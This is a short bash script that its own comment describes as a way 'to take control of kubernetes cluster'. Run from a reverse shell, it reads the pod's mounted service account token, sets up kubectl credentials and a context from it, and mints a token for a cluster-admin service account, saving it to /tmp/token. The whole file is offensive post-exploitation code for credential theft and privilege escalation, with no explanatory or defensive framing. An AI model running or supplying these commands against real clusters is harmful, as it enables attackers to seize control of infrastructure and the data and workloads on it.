#!/bin/bash
# execute command to take control of kubernetes cluster

# create new user from reverse-shell and using kubectl with kubernetes token
kubectl config set-credentials my-user --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token)

# set context with this user
kubectl config set-context sa-context --user=my-user

# Create new cluster-admin-sa token
kubectl create token cluster-admin-sa --namespace default > /tmp/token
export TOKEN=$(cat /tmp/token)

